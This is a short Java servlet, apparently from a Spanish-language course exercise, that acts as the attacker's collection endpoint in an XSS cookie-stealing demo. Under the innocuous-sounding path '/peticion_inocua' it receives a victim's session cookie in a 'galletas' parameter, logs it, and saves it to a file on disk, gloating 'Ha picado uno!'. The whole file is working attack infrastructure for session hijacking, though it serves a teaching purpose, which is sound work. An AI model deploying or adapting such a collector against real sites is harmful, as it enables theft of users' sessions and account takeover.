package com.curso.controlador;

import java.io.File;
import java.io.IOException;
import java.io.PrintWriter;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

//Este servlet recibe la identificación de session del proyecto XSS_Cookies
//y la escribe en un fichero
@WebServlet("/peticion_inocua")
public class SVCookieLog extends HttpServlet {
	private static final long serialVersionUID = 1L;
       
    public SVCookieLog() {
        super();
    }

	protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

		System.out.println("Ha picado uno!");
		String galletas = request.getParameter("galletas");
		
		System.out.println("Cookie:"+galletas);
		
		PrintWriter pw = new PrintWriter(new File("d:/galletas.txt"));
		pw.println(galletas);
		pw.close();
		
		PrintWriter out = response.getWriter();
		out.println("Pillaste!");
		
	}

	protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		doGet(request, response);
	}

}
